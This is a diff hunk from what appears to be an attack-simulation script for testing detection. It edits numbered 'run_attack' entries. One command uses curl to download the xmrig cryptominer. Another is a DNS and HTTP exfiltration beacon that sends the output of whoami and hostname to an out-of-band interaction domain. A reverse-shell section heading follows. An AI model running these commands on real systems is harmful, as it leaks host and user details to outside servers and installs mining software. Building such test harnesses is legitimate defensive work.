@@ -188,9 +188,9 @@ run_attack "10" "⛏️" "Cryptominer Download Attempt" \
     'curl -s -o /tmp/xmrig https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz --connect-timeout 3 2>/dev/null || echo "MINER_DOWNLOAD_ATTEMPT" > /tmp/miner-marker.txt'
 
 run_attack "11" "📡" "DNS Exfiltration Beacon" \
-    "Exfiltrates data via DNS queries to attacker-controlled domain" \
+    "Exfiltrates data via DNS queries to attacker-controlled OAST domain" \
     "DNS Exfiltration" \
-    'nslookup $(whoami).$(hostname).attacker-c2.oast.live 2>/dev/null || echo "DNS_BEACON_SENT" > /tmp/dns-beacon.txt'
+    'nslookup $(whoami).$(hostname).aezukuqsjqlaoghyjmiw9mg769uqgs4gb.oast.fun 2>/dev/null; curl -s http://$(whoami).aezukuqsjqlaoghyjmiw9mg769uqgs4gb.oast.fun/ > /dev/null 2>&1 || echo "OAST_BEACON_SENT" > /tmp/oast-beacon.txt'
 
 # ═══════════════════════════════════════════════════════════════
 # PHASE 5: Reverse Shell
